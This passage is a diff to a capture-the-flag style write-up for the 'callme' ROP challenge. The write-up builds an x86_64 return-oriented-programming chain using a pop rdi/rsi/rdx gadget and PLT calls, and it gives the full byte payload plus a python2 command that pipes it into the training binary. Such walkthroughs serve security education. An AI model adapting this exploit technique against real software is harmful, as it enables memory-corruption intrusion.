@@ -31,17 +31,15 @@ x86_64 calling convention tells us that the arguments are stored in the register
 
 Therefore, we need to set three parameters in rdi, rsi, rdx accordingly.
 
-We find the suitable gadgets in program.
+We find a suitable gadget in program.
 ```
 ...
 0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
-0x00000000004009a3 : pop rdi ; ret
-0x000000000040093e : pop rdx ; ret
 ...
 ```
-We use thers gadgets to set the arguments, and then jump to the plt function address, and repeated 3 times.
+We use this gadget to set the arguments, and then jump to the plt function address, and repeated 3 times.
 ```
-
+gadget -> call callme_one -> gadget -> call callme_two -> gadget -> call callme_three
 ```
 Now, we can build our payload.
 
@@ -49,6 +47,31 @@ First, same as problems before, the overflow buffer is 32 bytes, and rbp registe
 ```
 'A' * 32 + 'A' * 8
 ```
+We jump to gadget address and set three arguments accordingly: 
+```
+0x000000000040093c(gadget adress) + 0xdeadbeefdeadbeef(arg1 pop into rdi) + 0xcafebabecafebabe(arg2 pop into rsi) + 0xd00df00dd00df00d(arg3 pop into rdx) 
+```
+Then jump to the function callme_one address in plt:
+```
+0x0000000000400720 (callme_one@plt)
+```
+callme_two, callme_three do the same pattern:
+```
+0x000000000040093c(gadget adress) + 0xdeadbeefdeadbeef(arg1 pop into rdi) + 0xcafebabecafebabe(arg2 pop into rsi) + 0xd00df00dd00df00d(arg3 pop into rdx) + 0x0000000000400740 (callme_two@plt)
 
+0x000000000040093c(gadget adress) + 0xdeadbeefdeadbeef(arg1 pop into rdi) + 0xcafebabecafebabe(arg2 pop into rsi) + 0xd00df00dd00df00d(arg3 pop into rdx) + 0x00000000004006f0(callme_three@plt)
 
+```
+Finally, the payload will be:
+```
+'A'*40 + '\x3c\x09\x40\x00\x00\x00\x00\x00' + '\xef\xbe\xad\xde\xef\xbe\xad\xde' + '\xbe\xba\xfe\xca\xbe\xba\xfe\xca' + '\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0' + '\x20\x07\x40\x00\x00\x00\x00\x00' + '\x3c\x09\x40\x00\x00\x00\x00\x00' + '\xef\xbe\xad\xde\xef\xbe\xad\xde' + '\xbe\xba\xfe\xca\xbe\xba\xfe\xca' + '\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0' + '\x40\x07\x40\x00\x00\x00\x00\x00' + '\x3c\x09\x40\x00\x00\x00\x00\x00' + '\xef\xbe\xad\xde\xef\xbe\xad\xde' + '\xbe\xba\xfe\xca\xbe\xba\xfe\xca' + '\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0' + '\xf0\x06\x40\x00\x00\x00\x00\x00'
+```
+Execute program with payload:
+```
+python2 -c "print 'A'*40 + '\x3c\x09\x40\x00\x00\x00\x00\x00' + '\xef\xbe\xad\xde\xef\xbe\xad\xde' + '\xbe\xba\xfe\xca\xbe\xba\xfe\xca' + '\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0' + '\x20\x07\x40\x00\x00\x00\x00\x00' + '\x3c\x09\x40\x00\x00\x00\x00\x00' + '\xef\xbe\xad\xde\xef\xbe\xad\xde' + '\xbe\xba\xfe\xca\xbe\xba\xfe\xca' + '\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0' + '\x40\x07\x40\x00\x00\x00\x00\x00' + '\x3c\x09\x40\x00\x00\x00\x00\x00' + '\xef\xbe\xad\xde\xef\xbe\xad\xde' + '\xbe\xba\xfe\xca\xbe\xba\xfe\xca' + '\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0' + '\xf0\x06\x40\x00\x00\x00\x00\x00'" | ./callme
+```
+We obtain the flag:
+```
+ROPE{a_placeholder_32byte_flag!}
+```
 
